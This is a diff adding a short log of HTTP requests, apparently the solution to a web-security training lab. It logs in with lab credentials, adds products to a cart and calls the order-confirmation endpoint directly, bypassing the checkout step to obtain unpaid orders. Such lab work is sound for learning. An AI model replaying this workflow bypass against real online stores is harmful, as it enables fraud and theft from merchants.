@@ -1,0 +1,31 @@
+POST /login HTTP/1.1
+
+csrf=H5iZpZ3AK5JrMgWrNcGdn8c8xNnL2KBF&username=wiener&password=peter
+
+POST /cart HTTP/1.1
+
+productId=20&redir=PRODUCT&quantity=1
+
+GET /cart HTTP/1.1
+
+POST /cart/checkout HTTP/1.1
+
+csrf=spkZTzgUJjX3bgaJLBKtmL65zRhpGY1c
+
+GET /cart/order-confirmation?order-confirmed=true HTTP/1.1
+
+POST /cart HTTP/1.1
+
+productId=20&redir=PRODUCT&quantity=1
+
+GET /cart HTTP/1.1
+
+GET /cart/order-confirmation?order-confirmed=true HTTP/1.1
+
+POST /cart HTTP/1.1
+
+productId=1&redir=PRODUCT&quantity=1
+
+GET /cart HTTP/1.1
+
+GET /cart/order-confirmation?order-confirmed=true HTTP/1.1
